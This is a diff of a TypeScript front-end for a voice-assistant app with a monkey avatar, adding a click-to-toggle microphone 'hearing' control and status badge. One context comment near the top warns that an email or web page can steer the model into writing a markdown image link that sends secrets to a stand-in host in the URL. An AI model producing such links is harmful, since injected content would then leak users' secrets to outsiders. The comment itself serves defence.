@@ -29,6 +29,7 @@ import "./style.css";
 import "./game.css";
 import "./theme-blocky.css";
 import "./motion.css";
+import "./hearing.css";
 
 const $ = <T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
 // Markdown from the model is untrusted: an email or web page can steer it into writing ![](https://x/?d=<secrets>),
@@ -79,6 +80,43 @@ if (!forceSvg && webglAvailable()) {
   (window as any).__monkeyAvatar = { ready: true, kind: "svg", clips: [], morphs: [] };
 }
 decorateJungle($("#stage"));
+
+// Click (or Enter/Space on) Monkey: his hearing turns on (he listens now) or off (stops, and the mic is muted until
+// the next click). The app decides from his real state; the "hearing" event plays the whole-body reaction.
+let lastHearingClick = 0;
+function hearingClick() {
+  const now = performance.now();
+  if (now - lastHearingClick < 450) return;              // a double click / key repeat is one toggle, not on-then-off
+  lastHearingClick = now;
+  void api.toggle_hearing();
+}
+avatarHost.tabIndex = 0;
+avatarHost.setAttribute("role", "button");
+avatarHost.setAttribute("aria-label", "Monkey: click to talk, click again to turn his hearing off");
+avatarHost.title = "Click me to talk · click again to turn my hearing off";
+avatarHost.addEventListener("keydown", (e) => {
+  if (e.target === avatarHost && (e.key === "Enter" || e.key === " ")) { e.preventDefault(); hearingClick(); }
+});
+{
+  const a3 = (window as any).__monkeyAvatarObj;
+  if (a3) a3.onClick = hearingClick;
+  else avatarHost.addEventListener("click", hearingClick);          // the SVG monkey: the whole panel is him
+}
+function setHearingOff(off: boolean) {
+  let b = document.getElementById("hearBadge");
+  if (!b) {
+    b = document.createElement("button");
+    b.id = "hearBadge";
+    b.className = "hear-badge";
+    b.setAttribute("type", "button");
+    b.textContent = "🙉 Hearing off · click to turn on";
+    b.addEventListener("click", hearingClick);
+    avatarHost.parentElement?.append(b);
+  }
+  b.style.left = `${avatarHost.offsetLeft + avatarHost.offsetWidth / 2}px`;   // centred under him
+  b.hidden = !off;
+  avatarHost.classList.toggle("hearing-off", off);
+}
 
 /** Hook the recorded sound kit into the avatar's sound engine (bundled files + sounds made on this PC). */
 let soundsAttached = false;
@@ -534,7 +572,20 @@ function onEvent(name: string, p: any) {
     toggleToday(false, false);
   }
   switch (name) {
+    case "hearing": {
+      const a3 = (window as any).__monkeyAvatarObj;
+      if (a3?.hearingPop) a3.hearingPop(!!p.on);
+      else {                                                       // SVG monkey: the same pop on the panel
+        avatarHost.classList.remove("hear-on", "hear-off");
+        void avatarHost.offsetWidth;
+        avatarHost.classList.add(p.on ? "hear-on" : "hear-off");
+      }
+      setHearingOff(!!p.muted);
+      pop(p.on ? "👂 I'm listening" : "🙉 Hearing off");
+      break;
+    }
     case "state":
+      if (p.muted !== undefined) setHearingOff(!!p.muted);
       if (p.state === "transcribing" && lastVoice === "listening") { pulse($("#stateLabel")); pop("👂 Got it"); }
       if (lastConversation && p.conversation === false) pop("👋 Talk soon");
       if (p.conversation !== undefined) lastConversation = !!p.conversation;
